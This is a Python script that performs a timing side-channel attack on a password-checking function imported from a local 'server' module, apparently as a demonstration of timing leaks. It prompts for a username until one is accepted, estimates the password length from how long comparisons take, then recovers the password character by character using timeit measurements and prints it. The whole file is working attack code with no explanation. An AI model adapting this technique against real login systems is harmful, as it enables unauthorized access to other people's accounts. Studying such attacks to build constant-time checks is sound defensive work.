import itertools
import random
import string
import timeit
import numpy as np
from server import check_password

allowed_chars = string.digits + string.ascii_letters + string.punctuation + ' '

def random_str(size):
    return ''.join(random.choices(allowed_chars, k=size))

def crack_length(user, max_len=12, verbose=False) -> int:
    trials = 2000
    times = np.empty(max_len)
    for i in range(max_len):
        i_time = timeit.repeat(stmt='check_password(user, x)',
                               setup=f'user={user!r};x=random_str({i!r})',
                               globals=globals(),
                               number=trials,
                               repeat=20)
        times[i] = min(i_time)

    if verbose:
        most_likely_n = np.argsort(times)[::-1][:5]
        print(most_likely_n, times[most_likely_n] / times[most_likely_n[0]])

    most_likely = int(np.argmax(times))
    return most_likely

def crack_password(user, length, verbose=False):
    guess = random_str(length)
    counter = itertools.count()
    trials = 1000
    while True:
        i = next(counter) % length
        for c in allowed_chars:
            alt = guess[:i] + c + guess[i + 1:]

            alt_time = timeit.repeat(stmt='check_password(user, x)',
                                     setup=f'user={user!r};x={alt!r}',
                                     globals=globals(),
                                     number=trials,
                                     repeat=10)
            guess_time = timeit.repeat(stmt='check_password(user, x)',
                                       setup=f'user={user!r};x={guess!r}',
                                       globals=globals(),
                                       number=trials,
                                       repeat=10)

            if check_password(user, alt):
                return alt

            if min(alt_time) > min(guess_time):
                guess = alt
                if verbose:
                    print(guess)

while True:
    user = input('Enter The User Name: ')
    username = check_password(user, None)
    if type(username) is not str:
        print(f"User '{user}' found!!")
        break
    print(username)

length = crack_length(user, verbose=True)
print(f"using most likely length {length}")
input("hit enter to continue...")
password = crack_password(user, length, verbose=True)
print(f"password cracked:'{password}'")

